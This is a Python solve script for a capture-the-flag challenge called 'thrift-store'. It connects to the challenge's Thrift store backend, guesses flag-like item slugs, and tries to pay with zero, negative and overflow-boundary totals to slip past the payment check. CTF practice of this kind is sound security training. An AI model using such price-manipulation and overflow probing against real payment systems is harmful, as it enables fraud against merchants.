#!/usr/bin/env python3
import argparse
import sys
from typing import List, Optional

try:
    import thriftpy2
    from thriftpy2.rpc import make_client
    from thriftpy2.transport import TFramedTransportFactory
    from thriftpy2.thrift import TApplicationException
except Exception as e:
    print("Missing dependency: thriftpy2. Install with: pip install thriftpy2", file=sys.stderr)
    raise


def connect(host: str, port: int):
    store_thrift = thriftpy2.load("store.thrift", module_name="store_thrift")
    client = make_client(
        store_thrift.Store,
        host,
        port,
        timeout=5000,
        trans_factory=TFramedTransportFactory(),
    )
    return client, store_thrift


def list_inventory(client) -> None:
    try:
        items = client.getInventory()
    except TApplicationException as e:
        print(f"getInventory failed: {e}")
        return
    print("Inventory:")
    for it in items:
        # Some fields may be missing depending on server IDL; be defensive.
        slug = getattr(it, "slug", None)
        name = getattr(it, "name", None)
        desc = getattr(it, "description", None)
        price = getattr(it, "price", None)
        line = f"- {slug or '?'} | {name or '?'}"
        if price is not None:
            line += f" | price={price}"
        print(line)
        if desc:
            print(f"  {desc}")


def attempt_buy_flag(client, slugs: List[str], totals: List[int]) -> Optional[str]:
    basket = client.createBasket()
    print(f"Created basket: {basket}")

    added_any = False
    for slug in slugs:
        try:
            print(f"Adding {slug} ...", end="", flush=True)
            client.addToBasket(basket, slug)
            print(" ok")
            added_any = True
        except TApplicationException as e:
            print(f" failed ({e})")
        except Exception as e:
            print(f" failed ({e})")

    if not added_any:
        print("No items were added successfully; cannot proceed to pay.")
        return None

    try:
        current = client.getBasket(basket)
        print("Basket items:", current)
    except Exception:
        pass

    for total in totals:
        try:
            print(f"Paying with total={total} ...", end="", flush=True)
            receipt = client.pay(basket, total)
            print(" ok")
            if isinstance(receipt, str):
                print("Server response:", receipt)
                return receipt
        except TApplicationException as e:
            # Look for server-side validation messages like "Total does not match basket total"
            print(f" failed ({e})")
        except Exception as e:
            print(f" failed ({e})")

    return None


def main():
    parser = argparse.ArgumentParser(description="Interact with the thrift-store backend.")
    parser.add_argument("host", nargs="?", default="thrift-store.chal.imaginaryctf.org")
    parser.add_argument("port", nargs="?", type=int, default=9090)
    parser.add_argument("--list", action="store_true", help="List inventory and exit")
    parser.add_argument("--slugs", nargs="*", help="Item slugs to add (default tries flag-like slugs)")
    args = parser.parse_args()

    client, _ = connect(args.host, args.port)

    if args.__dict__["list"]:
        list_inventory(client)
        return

    # Candidates to try as potential flag slugs
    default_flag_slugs = [
        "flag",
        "the-flag",
        "buy-flag",
        "flag-item",
        "ctf-flag",
        "imaginary-flag",
        "mystery-box",
        "secret",
        "secret-flag",
    ]

    slugs = args.slugs if args.slugs else default_flag_slugs

    # Totals to try; includes normal (0), extreme signed/unsigned boundaries to poke for validation/overflow issues.
    totals = [
        0,
        1,
        -1,
        (1 << 31) - 1,
        -(1 << 31),
        (1 << 32) - 1,
        (1 << 63) - 1,
        -(1 << 63),
    ]

    receipt = attempt_buy_flag(client, slugs, totals)
    if receipt:
        print("Potential flag/receipt:", receipt)
    else:
        print("No success yet. Try --list to inspect inventory, then re-run with --slugs <items>.")


if __name__ == "__main__":
    main()

